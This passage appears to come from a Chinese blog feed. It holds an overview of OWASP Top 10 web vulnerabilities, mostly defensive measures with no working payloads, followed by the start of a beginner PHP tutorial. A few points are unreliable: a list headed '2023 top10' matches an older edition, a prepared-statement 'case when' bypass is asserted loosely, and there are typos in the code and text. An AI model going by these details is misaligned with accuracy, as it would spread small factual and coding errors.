<p>通过修改 URL、内部应用程序状态或 HTML 页面，或仅使用自定义 API 攻击工具来绕过访问控制检查。<br>允许将主键更改为其他用户的记录，允许查看或编辑其他人的帐户。<br>特权提升。在未登录的情况下充当用户或以用户身份登录时充当管理员。<br>元数据操作，例如重放或篡改 JSON Web 令牌 (JWT) 访问控制令牌，或用于提升权限或滥用 JWT 失效的 cookie<br>或隐藏字段。<br>CORS 错误配置允许未经授权的 API 访问。<br>强制以未经身份验证的用户身份浏览经过身份验证的页面或以标准用户身份浏览特权页面。访问 API 时缺少对 POST、PUT 和 DELETE<br>的访问控制。</p>
</blockquote>
<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>1：除公有资源外，其他资源默认情况下拒绝访问。<br>2：使用一次性的访问控制机制，并在整个应用程序中不断重用它们。<br>3：建立访问控制模型以强制执行所有权记录，而不是接受用户创建、读取、更新或删除的任何记录。<br>4：当用户注销后，服务器上的JWT令牌应失效。</p>
<h1 id="2-注入："><a href="#2-注入：" class="headerlink" title="2.注入："></a>2.注入：</h1><p>（Injection）攻击者向应用程序中输入恶意代码，使其执行未经授权的操作。 </p>
<p>攻击方式：SQL注入、LDAP注入、OS命令注入等。</p>
<h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>输入恶意的sql语句，改变后台原有的sql语句。</p>
<h3 id="防御-1"><a href="#防御-1" class="headerlink" title="防御"></a>防御</h3><p> 1：对输入进行严格的转义和过滤。<br>   2：数据类型进行严格定义，数据长度进行严格规定。<br>   3：通过waf设备启用防止sql注入的策略。<br>   4：严格限制网站访问数据库的权限。</p>
<h2 id="os注入"><a href="#os注入" class="headerlink" title="os注入"></a>os注入</h2><p>通过Shell执行OS命令时，或者开发中用到的某个方法其内部利用了Shell时，就有可能出现OS命令被任意执行的情况。这种现象被称为OS命令注入。</p>
<h3 id="防御-2"><a href="#防御-2" class="headerlink" title="防御"></a>防御</h3><p> 1：使用安全的函数对传递给OS命令参数进行转义。<br>   2：不将外界输入的字符串传递给命令行参数。<br>   3：选择不调用OS命令的实现方法。</p>
<p> 防御方法：使用参数化查询&#x2F;预编译(这样缺的只是数据，不会对sql语句造成其他影响，因为sql语句已经通过预编译技术固定下来了)、输入校验和白名单、最小化权限等。</p>
<p>但是预编译的话，也是存在绕过的，那就是case when绕过。</p>
<p>ldap:轻量级目录访问协议，类似于数据库，因为可以进行数据存储，但存储的是目录。用于查询比较多。</p>
<p>windows下使用ADAM，linux下使用openLDAP</p>
<h1 id="3-失效的身份认证："><a href="#3-失效的身份认证：" class="headerlink" title="3.失效的身份认证："></a>3.失效的身份认证：</h1><p>错误使用应用程序的身份认证和会话管理功能，攻击者能够破译密码、密钥或会话令牌，或者暂时或永久的冒充其他用户的身份。</p>
<blockquote>
<p>身份认证:身份认证最常用于系统登录，形式一般为用户名加密码的登录方式，在安全性要求较高的情况下，还有验证码、客户端证书、Ukey等。<br>会话管理:HTTP利用会话机制来实现身份认证，HTTP身份认证的结果往往是获得一个令牌并放在cookie中，之后的身份识别只需读取授权令牌，如果授权令牌认证成功，那么就无需再次进行登录认证。</p>
</blockquote>
<h2 id="防御-3"><a href="#防御-3" class="headerlink" title="防御"></a>防御</h2><p>1：区分公共区域和受限区域:站点的公共区域允许匿名用户访问，但是站点的受限区域只允许指定用户访问。<br>2：支持密码的有效期:向用户提供可以在一段时间后修改密码的功能。<br>3：能够禁用账户:在收到攻击后可以禁用账户来避免遭受进一步的损失。<br>4：要求用户使用强密码。<br>5：不要在网络上以纯文本方式传输用户名和密码:使用SSL对数据流进行加密，也可以对cookie进行加密。</p>
<h1 id="4-XXE漏洞原理："><a href="#4-XXE漏洞原理：" class="headerlink" title="4.XXE漏洞原理："></a>4.XXE漏洞原理：</h1><p>（XML External Entities (XXE)） 应用程序解析XML时，未正确处理外部实体，导致攻击者可以访问系统文件、执行命令等。</p>
<blockquote>
<p>xml <strong>可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声名、DTD文档类型定义、文档元素。</strong></p>
</blockquote>
<p> 攻击方式：XXE攻击等。</p>
<p> 防御方法：禁用外部实体、使用最新版本的XML解析器、输入校验等。</p>
<h1 id="5-安全配置错误漏洞原理："><a href="#5-安全配置错误漏洞原理：" class="headerlink" title="5.安全配置错误漏洞原理："></a>5.安全配置错误漏洞原理：</h1><p>由于操作者的不当配置(默认配置，临时配置，开源云存储，http标头配置，以及包含敏感信息的详细错误)，导致攻击者可以利用这些配置获取到更高的权限，安全配置错误可以发生在各个层面，包含平台、web服务器、应用服务器、数据库、架构和代码。</p>
<h2 id="防御-4"><a href="#防御-4" class="headerlink" title="防御"></a>防御</h2><p>1：使用的服务不包含任何不必要的功能、组件、文档和示例，移除或不安装不适用的功能和框架。<br>2：及时检测系统服务版本，为已发现的漏洞打补丁。<br>3：在对文件等分配权限时，根据其工作需要采取最小权限原则的方法。<br>4：自动化安装部署。<br>5：实施漏洞扫描和安全审计。</p>
<h1 id="6-xss跨站脚本攻击原理："><a href="#6-xss跨站脚本攻击原理：" class="headerlink" title="6.xss跨站脚本攻击原理："></a>6.xss跨站脚本攻击原理：</h1><p>（Cross-Site Scripting (XSS)） 攻击者向应用程序中输入恶意脚本，使其在用户的浏览器中执行。 </p>
<p>详细解释：例如在表单中提交含有可执行的javascript的内容文本，如果服务器端没有过滤或转义这些脚本，而这些脚本由通过内容的形式发布到了页面上，这个时候如果有其他用户访问这个网页，那么浏览器就会执行这些脚本，从而被攻击，从而获取用户的cookie等信息。</p>
<blockquote>
<p>存储型XSS：存储型XSS，持久化，代码是存储在服务器中的，如在个人信息或发表文章等地方，插入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，用户访问该页面的时候触发代码执行。这种XSS比较危险，容易造成蠕虫，盗窃cookie。<br> 反射型XSS：非持久化，需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。<br> DOM型XSS：不经过后端，DOM-XSS漏洞是基于文档对象模型(Document Objeet Model,DOM)的一种漏洞，攻击者向服务器发送一个带有恶意JS代码的请求，服务器的响应不会以任何形式包含攻击者的脚本。当用户的浏览器处理这个响应时，DOM对象就会处理XSS代码，导致存在XSS漏洞。</p>
</blockquote>
<p> 防御方法：输入校验、输出转义、HTTPOnly标记等。</p>
<h1 id="7-不安全的反序列化漏洞原理："><a href="#7-不安全的反序列化漏洞原理：" class="headerlink" title="7.不安全的反序列化漏洞原理："></a>7.不安全的反序列化漏洞原理：</h1><p>序列化是将对象的状态信息转换为可以存储或传输的形式的过程。</p>
<p>（Insecure Deserialization）应用程序在<strong>反序列化数据时未正确验证其完整性和有效性</strong>，导致攻击者可以执行未经授权的代码。</p>
<h2 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h2><p>如果应用对恶意构造的用户输入的数据进行反序列化，这样就会产生非预期的对象，从而有可能产生远程代码执行。或者应用中存在可以在反序列化过程中或者之后被改变行为的类，则攻击者可以通过改变应用逻辑或者实现远程代码执行攻击。我们将其称为对象和数据结构攻击。</p>
<h2 id="防御-5"><a href="#防御-5" class="headerlink" title="防御"></a>防御</h2><p>1：最安全的方法是不接受来自不受信源的序列化对象，或使用只允许原始数据类型的序列化媒体。<br>2：反序列化之前，先进行严格的数据类型校验。由于校验规则容易被攻击者探索出来，进而容易被绕过，因此防御不能仅依赖这一个手段，但可以作为完整性校验防御方案的补充。<br>3：<strong>隔离运行那些在低特权</strong>环境中反序列化的代码。<br>4：<strong>对反序列化过程进行详尽的日志记录</strong>，监控反序列化过程，在发现疑似反序列化攻击时进行警报。</p>
<h1 id="8-使用含有已知漏洞的组件原理："><a href="#8-使用含有已知漏洞的组件原理：" class="headerlink" title="8.使用含有已知漏洞的组件原理："></a>8.使用含有已知漏洞的组件原理：</h1><p>（Using Components with Known Vulnerabilities） 应用程序（或库、框架和其他软件模块）使用已知存在漏洞的第三方组件和API，导致攻击者可以利用这些漏洞攻击应用程序。 </p>
<h2 id="防御-6"><a href="#防御-6" class="headerlink" title="防御"></a>防御</h2><p>1：识别正在使用的组件和版本，包括所有的依赖。</p>
<p>2：更新组件或引用的库文件到最新。</p>
<p>3：建立安全策略来管理组件的使用。</p>
<h1 id="9-不足的日志记录与监控原理："><a href="#9-不足的日志记录与监控原理：" class="headerlink" title="9.不足的日志记录与监控原理："></a>9.不足的日志记录与监控原理：</h1><p>（Insufficient Logging &amp; Monitoring）应用程序未正确记录或监控其活动，导致攻击者可以执行未经授权的操作而不被检测。</p>
<blockquote>
<p><strong>日志记录包括登录成功记录、登录失败记录、访问控制记录等，用来记录服务器的各种信息。</strong></p>
</blockquote>
<h2 id="防御-7"><a href="#防御-7" class="headerlink" title="防御"></a>防御</h2><p>1：确保所有登录、访问控制失败、输入验证失败能够被记录到日志中去，并保留足够的用户上下文信息，以识别可疑或恶意帐户，并为后期取证预留足够时间。<br>2：建立有效的监控和告警机制，使可疑活动在可接受的时间内被发现和应对。<br>3：完善日志系统，使其可以监控各种日志信息。<br>4：及时对日志系统进行备份，并保存足够长时间。</p>
<h1 id="10-敏感数据泄露"><a href="#10-敏感数据泄露" class="headerlink" title="10.敏感数据泄露"></a>10.敏感数据泄露</h1><p>一般我们的敏感信息包括密码、财务数据、医疗数据等，由于web应用或者API未加密或不正确的保护敏感数据，这些数据极易遭到攻击者利用，攻击者可能使用这些数据来进行一些犯罪行为。</p>
<h2 id="防御-8"><a href="#防御-8" class="headerlink" title="防御"></a>防御</h2><p>1：对系统处理、存储或传输的数据分类，并根据分类进行访问控制。<br>2：对重要数据进行加密存放，数据在传输过程中使用密文进行传输。<br>3：及时清理没有用的敏感数据，只能使用指定用户访问敏感数据。</p>
<h1 id="2023-top10"><a href="#2023-top10" class="headerlink" title="2023 top10"></a>2023 top10</h1><h2 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h2><h2 id="失效的身份认证和会话管理"><a href="#失效的身份认证和会话管理" class="headerlink" title="失效的身份认证和会话管理"></a>失效的身份认证和会话管理</h2><p><strong>退出、密码管理、超时、密码找回、帐户更新等方面存在漏洞。</strong></p>
<p><strong>防御：</strong></p>
<blockquote>
<p>1、区分公共区域和受限区域。<br>2、对最终用户帐户使用帐户锁定策略。<br>3、支持密码有效期。<br>4、能够禁用帐户。<br>5、不要存储用户密码。<br>6、要求使用强密码。<br>7、不要在网络上以纯文本形式发送密码。<br>8、保护身份验证 Cookie。<br>9、使用 SSL 保护会话身份验证 Cookie。<br>10、对身份验证 cookie 的内容进行加密。<br>11、限制会话寿命。<br>12、避免未经授权访问会话状态。****</p>
</blockquote>
<h2 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h2><p>构造恶意的html代码</p>
<h2 id="直接引用不安全对象"><a href="#直接引用不安全对象" class="headerlink" title="直接引用不安全对象"></a>直接引用不安全对象</h2><p><strong>（IDOR）允许攻击者绕过网站的身份验证机制，并通过修改指向对象链接中的参数值来直接访问目标对象资源，这类资源可以是属于其他用户的数据库条目以及服务器系统中的隐私文件等等。</strong></p>
<p><strong>服务器上的具体文件名、路径或数据库关键字等内部资源被暴露在URL或网页中，攻击者可以尝试直接访问其他资源。</strong></p>
<p><strong>防御措施：</strong></p>
<blockquote>
<p>1.使用基于用户或会话的间接对象访问，这样可防止攻击者直接攻击未授权资源<br>2.访问检查：对任何来自不受信源所使用的所有对象进行访问控制检查<br>3.避免在url或网页中直接引用内部文件名或数据库关键字<br>4.验证用户输入和url请求，拒绝包含.&#x2F; …&#x2F;的请求</p>
<p>5 、安全配置错误 5、安全配置错误</p>
</blockquote>
<h2 id="安全配置错误"><a href="#安全配置错误" class="headerlink" title="安全配置错误"></a>安全配置错误</h2><p><strong>不安全的默认配置、不完整的临时配置、开源云存储、错误的HTTP 标头配置以及包含敏感信息的详细错误信息所造成的。</strong></p>
<p><strong>攻击者能够通过未修复的漏洞、访问默认账户、不再使用的页面、未受保护的文件和目录等来取得对系统的未授权的访问或了解。</strong></p>
<p><strong>防御措施：</strong></p>
<blockquote>
<p>1、 配置所有的安全机制<br>2、 最小原则，关掉或限制不使用的服务<br>3、 更改默认账户信息<br>4、 使用日志和警报<br>5、 回显信息不显示任何与实际错误相关的信息<br>6、 检查和修复安全配置项</p>
</blockquote>
<h2 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h2><p><strong>许多web应用程序和app都无法正确保护敏感数据，攻击者可以通过窃取或修改未加密的数据来实施信用卡诈骗、身份盗窃或其他犯罪行为。未加密的敏感数据容易受到破坏，因此，我们需要对敏感数据加密，这些数据包括：传输过程中的数据、存储的数据以及浏览器的交互数据。</strong></p>
<p><strong>1、手工挖掘，查看web容器或网页源码代码，可能存在敏感信息。比如访问url下的目录，直接列出了目录下的文件列表，错误的报错信息包含了网站的信息。<br>2、工具挖掘，像爬虫之类的工具可以扫描到敏感文件路径，从而找到敏感数据。</strong></p>
<p><strong>防御</strong></p>
<blockquote>
<p>1、 对系统处理、存储或传输的数据进行分类，根据分类进行访问控制。<br>2、 对用户敏感信息的传输和存储进行加密<br>3、 强化安全意识</p>
</blockquote>
<h2 id="缺少功能级的访问控制"><a href="#缺少功能级的访问控制" class="headerlink" title="缺少功能级的访问控制"></a>缺少功能级的访问控制</h2><p><strong>大多数Web应用程序的功能在UI页面显示之前,会验证功能级别的访问权限。但是,应用程序需要在每个功能被访问时在服务器端执行相同的访问控制检查。如果请求没有被验证,攻击者能够伪造请求从而在未经适当授权时访问功能。</strong></p>
<p><strong>防御</strong></p>
<blockquote>
<p>1、 设计严格的权限控制系统，对于每个请求和URL都要进行校验和权限确认，防止非法请求被执行<br>2、 对于每个功能的访问，都要有明确的角色授权，采用过滤器的方式校验每个请求的合法性<br>3、 实现Web访问的IP白名单列表，禁止不可信的IP访问Web系统</p>
</blockquote>
<h2 id="csrf"><a href="#csrf" class="headerlink" title="csrf"></a>csrf</h2><p>借助受害者的登录身份，向网站发送不安全请求。</p>
<p>防御手段：</p>
<blockquote>
<p>1、验证 HTTP Referer 字段。<br>根据HTTP协议，在HTTP头中有一个字段叫Referer，它记录了该HTTP请求的来源地址。<br>2、在请求地址中添加 token 并验证<br>在HTTP请求中以参数的形式加入一个随机产生的token（随机字符串），并在服务器端建立一个拦截器来验证这个token，如果请求中没有token或者token内容不正确，则认为可能是CSRF攻击而拒绝该请求。<br>3、二次验证<br>在转账等关键操作之前提供当前用户的密码或者验证码。二次验证可以有效防御CSRF 攻击。</p>
</blockquote>
<h2 id="使用含有已知漏洞的组件"><a href="#使用含有已知漏洞的组件" class="headerlink" title="使用含有已知漏洞的组件"></a>使用含有已知漏洞的组件</h2><h2 id="未验证的重定向和转发"><a href="#未验证的重定向和转发" class="headerlink" title="未验证的重定向和转发"></a>未验证的重定向和转发</h2><p><strong>重定向是服务端根据逻辑，发送一个状态码（通常为3xx），告诉浏览器重新去请求那个地址.所以地址栏显示的是新的URL。（重定向是在客户端完成的）</strong><br><strong>转发：</strong><br><strong>转发是在服务器内部将请求转发给另一个资源，把那个URL的响应内容读取过来,然后把这些内容再发给浏览器.浏览器根本不知道服务器发送的内容从哪里来的,因为这个跳转过程是在服务器实现的，并不是在客户端实现的所以客户端并不知道这个跳转动作，所以它的地址栏还是原来的地址。（转发是在服务器端完成的）</strong></p>
<h1 id="csrf-1"><a href="#csrf-1" class="headerlink" title="csrf"></a>csrf</h1><p>攻击者利用受害者在已认证的会话中的身份，以伪造的方式向目标网站发送恶意请求，使目标网站执行攻击者所期望的操作。</p>
<p>危害：未经授权的操作（如修改密码、发送消息）、数据损坏或篡改、恶意应用程序安装、账户劫持等。</p>
<p>防护：token，同源检查、referer</p>
<h1 id="未经验证的重定向和转发"><a href="#未经验证的重定向和转发" class="headerlink" title="未经验证的重定向和转发"></a>未经验证的重定向和转发</h1><p>导致攻击者能够构造恶意的重定向或转发链接，将用户重定向到恶意网站或执行未经授权的操作。</p>
<p>危害：</p>
<ul>
<li>用户被重定向到恶意网站：攻击者可以伪装成合法的网站，引诱用户点击恶意链接，从而导致用户暴露于各种网络攻击中，如钓鱼、恶意软件下载等。</li>
<li>用户凭证被窃取：通过将用户重定向到恶意网站并伪造登录页面，攻击者可以窃取用户的凭证信息，例如用户名、密码等。</li>
<li>跨站脚本攻击（XSS）：攻击者可以构造恶意的重定向链接，从而在目标网站上执行跨站脚本攻击，获取用户敏感信息或篡改网页内容。</li>
</ul>
<p>防护措施：</p>
<ul>
<li>对重定向和转发目标进行验证：在应用程序中，对跳转链接的目标进行验证，确保跳转目标是受信任的、合法的网址。</li>
<li>使用白名单验证：限制重定向和转发目标，只允许跳转到事先定义的受信任的网址列表上。</li>
<li>避免在URL参数中传递敏感信息：尽量避免将敏感信息（如会话标识）放在跳转链接的URL参数中，以减少被攻击者利用的风险。</li>
<li>对重定向和转发链接进行编码：在生成跳转链接时，对URL参数进行编码，防止攻击者利用特殊字符构造恶意链接。</li>
</ul>
]]></content>
      <categories>
        <category>top10</category>
      </categories>
      <tags>
        <tag>漏洞</tag>
        <tag>xss</tag>
        <tag>RCE</tag>
        <tag>upload</tag>
        <tag>xxe</tag>
        <tag>ldap</tag>
      </tags>
  </entry>
  <entry>
    <title>php语言基础</title>
    <url>/2023/05/31/php/</url>
    <content><![CDATA[<h1 id="一-基础"><a href="#一-基础" class="headerlink" title="一.基础"></a>一.基础</h1><h2 id="1-变量分类"><a href="#1-变量分类" class="headerlink" title="1.变量分类"></a>1.变量分类</h2><h3 id="1-可变变量"><a href="#1-可变变量" class="headerlink" title="1.可变变量"></a>1.可变变量</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);<span class="comment">//编码设置</span></span><br><span class="line"><span class="variable">$bao</span>=<span class="string">&#x27;biao&#x27;</span>;</span><br><span class="line"><span class="variable">$biao</span>=<span class="string">&#x27;鼠标&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$bao</span>.<span class="string">&quot;///&quot;</span>.<span class="variable">$$bao</span>; <span class="comment">//$$bao即可变变量</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>结果为:biao&#x2F;&#x2F;&#x2F;鼠标</p>
<h3 id="2-外部变量"><a href="#2-外部变量" class="headerlink" title="2.外部变量"></a>2.外部变量</h3><p>即php在使用过程中规定好的一些变量。</p>
<p>在html文件中写入</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;lx2.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;passwrod&quot;</span> <span class="attr">name</span>=<span class="string">&quot;pwd&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;提交&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>在php文件中写入</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$u</span> =<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$u</span>.<span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$p</span> =<span class="variable">$_POST</span>[<span class="string">&#x27;pwd&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$p</span>.<span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>则在html中输入的用户名与密码，提交过后，会跳转到php页面进行输出显示。</p>
<h4 id="总结外部变量"><a href="#总结外部变量" class="headerlink" title="总结外部变量"></a>总结外部变量</h4><blockquote>
<p>$_COOKIE 会话控制中的cookie传值信息</p>
<p>$_SESSION 会话控制中的session传值信息</p>
<p>$_FILES 文件撒很难过船的结果</p>
<p>$_GET url上的参数值</p>
<p>$_POST 表单提交的参数值</p>
<p>$_REQUEST 可以得到get或post的传值结果</p>
</blockquote>
<h3 id="3-环境变量"><a href="#3-环境变量" class="headerlink" title="3.环境变量"></a>3.环境变量</h3><p>$_SERVER[“REQUEST_METHOD”] 请求当前php页面的方法</p>
<p>…..</p>
<h2 id="2-常量"><a href="#2-常量" class="headerlink" title="2.常量"></a>2.常量</h2><p><code>define(常量名，值);</code></p>
<blockquote>
<p>说明:</p>
<p>可小写，可不加引号；但通常大写，加引号</p>
<p>字符串中调用常量时，必须在引号外面</p>
</blockquote>
<p>此外，还有内置常量：</p>
<blockquote>
<p>LINE 当前所在行</p>
<p>FILE 当前文件在服务器的路径</p>
<p>FUNCTION 当前函数名</p>
<p>CLASS 当前类名</p>
<p>METHOD 当前成员方法名</p>
<p>PHP_OS PHP运行的操作系统</p>
<p>PHP_VERSION 当前PHP版本</p>
<p>DIR 文件所在目录信息</p>
<p>NAMESPACE 当前命名空间的名称</p>
</blockquote>
<h2 id="3-字界符"><a href="#3-字界符" class="headerlink" title="3.字界符"></a>3.字界符</h2><p>一般英文大写，&gt;&gt;&gt;开始字符+结束字符（相同）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$string</span> = <span class="string">&lt;&lt;&lt;AAA</span></span><br><span class="line"><span class="string">fdhjkdf</span></span><br><span class="line"><span class="string">sdjkf</span></span><br><span class="line"><span class="string">fglkl;sdgjk   dkl</span></span><br><span class="line"><span class="string">sdfgk</span></span><br><span class="line"><span class="string">AAA</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$string</span>;<span class="comment">//字界符声明字符串</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>结果:fdhjkdf sdjkf fglkl;sdgjk dkl sdfgk</p>
</blockquote>
<h2 id="4-注释"><a href="#4-注释" class="headerlink" title="4.注释"></a>4.注释</h2><p>同c++，单行&#x2F;&#x2F; 多行&#x2F;* *&#x2F;</p>
<h2 id="5-查看和判断变量类型"><a href="#5-查看和判断变量类型" class="headerlink" title="5.查看和判断变量类型"></a>5.查看和判断变量类型</h2><blockquote>
<p>gettype()，获得变量的类型</p>
<p>var_dump()输出变量类型和值</p>
</blockquote>
<p>is_callable()是否为函数</p>
<p>双引号一般是解析变量，单引号效率高一点</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_callable</span>(<span class="string">&quot;echo&quot;</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;执行真区间&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;执行假区间&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>echo是一个语言结构，不是函数，没有返回值，所以结果为假</p>
<h2 id="6-比较运算符号"><a href="#6-比较运算符号" class="headerlink" title="6.比较运算符号"></a>6.比较运算符号</h2><p>&#x3D;&#x3D;&#x3D; 全等，判断类型、值等于</p>
<p>如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$x=5.1;</span><br><span class="line">$y=5.10;   //全等</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$x=&#x27;5.1&#x27;;</span><br><span class="line">$y=5.10;   //不全等</span><br></pre></td></tr></table></figure>

<p>!&#x3D;&#x3D;不全等，判断类型、值不等于</p>
<h2 id="7-流程控制语句"><a href="#7-流程控制语句" class="headerlink" title="7.流程控制语句"></a>7.流程控制语句</h2><p>if…else</p>
<p>switch</p>
<p>(do) while</p>
<p>for 循环</p>
<p>同c++；</p>
<p>goto 循环语句</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">goto</span> enen;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;123&#x27;</span>;</span><br><span class="line"></span><br><span class="line">enen:</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;goto语句触发&#x27;</span>;</span><br><span class="line">    &gt;?</span><br></pre></td></tr></table></figure>

<p>结果为：goto语句触发</p>
<p>可以在for循环里，查找到特定某项时，goto输出</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="number">100</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;第&#x27;</span>.<span class="variable">$i</span>.<span class="string">&#x27;次&lt;br /&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$i</span> == <span class="number">15</span>)&#123;</span><br><span class="line">        <span class="keyword">goto</span> end;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">end:</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;不干了&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>结果：</p>
<p>第0次</p>
<p>…</p>
<p>第15次</p>
<p>不干了</p>
</blockquote>
<h2 id="8-函数基本语法"><a href="#8-函数基本语法" class="headerlink" title="8.函数基本语法"></a>8.函数基本语法</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> 函数名(<span class="params">参数名<span class="number">1</span>=[值<span class="number">1</span>], 参数名<span class="number">2</span>=[值<span class="number">2</span>] , 参数名n=[值n]</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    函数中的功能体</span><br><span class="line">    [<span class="keyword">return</span> 返回值]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以可以参照外部变量时的php代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	</span><br><span class="line"><span class="variable">$u</span> =<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$u</span>.<span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$p</span> =<span class="variable">$_POST</span>[<span class="string">&#x27;pwd&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$p</span>.<span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="公用代码处理"><a href="#公用代码处理" class="headerlink" title="公用代码处理"></a>公用代码处理</h3><p>一般会将公用代码放到一个文件中，使用时包含这个文件即可。</p>
<p>包含文件的方法有4种：</p>
<blockquote>
<ol>
<li>include  文件继续向下执行，通常用于动态包含 ；包含失败会返回警告</li>
<li>require 代码不会继续向下执行，通常包含及其重要的文件；失败会返回致命错误</li>
<li>include_once 若该文件曾经包含过，则不再包含；失败时返回警告</li>
<li>require_once  防止文件反复包含；失败时返回致命错误</li>
</ol>
</blockquote>
<h3 id="文件包含举例-include"><a href="#文件包含举例-include" class="headerlink" title="文件包含举例-include"></a>文件包含举例-include</h3><p>如2.php内容如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;	</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;this is 2.php&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>同级目录中22.php内容如下：</p>
